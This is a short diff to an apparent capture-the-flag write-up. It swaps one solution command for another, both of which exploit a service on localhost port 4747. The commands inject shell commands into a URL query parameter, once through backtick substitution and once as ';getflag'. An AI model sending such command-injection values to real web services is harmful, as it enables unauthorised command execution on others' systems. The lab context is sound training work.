@@ -64,5 +64,5 @@ Connection to localhost 4747 port [tcp/*] succeeded!
 # solve
 > curl localhost:4747/?x="\`$(which getflag)\`"
 or
-> echo -e "GET /?x=\`$(which getflag)\` HTTP/1.1\r\nHost: localhost\r\n\r\n" | nc localhost 4747
+> curl --get --data-urlencode 'x=;getflag' http://localhost:4747
 ```
